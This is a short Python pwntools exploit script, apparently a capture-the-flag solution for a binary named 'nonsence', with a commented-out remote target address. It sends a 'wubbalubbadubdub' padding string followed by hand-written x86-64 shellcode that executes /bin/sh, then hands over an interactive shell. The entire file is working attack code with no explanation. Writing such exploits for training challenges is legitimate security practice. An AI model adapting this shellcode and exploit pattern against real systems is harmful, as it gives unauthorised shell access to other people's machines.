from pwn import *

context.update(arch='amd64', os='linux')

p = process('./nonsence')
#p = remote('60.250.197.227', 10001)

p.recv()

secret = 'A'*16 + 'w ' + 'wubbalubbadubdub' + 'A'*16
shellcode = asm("""
xor rdi, rdi
mov rdi, 0x68732f6e69622f
push rdi
xor rdi, rdi
mov rdi, rsp
xor rcx, rcx
xor rdx, rdx
xor rsi, rsi
xor rax, rax
mov al,  59
syscall
""")

payload = secret + shellcode

p.send(payload)
p.interactive()

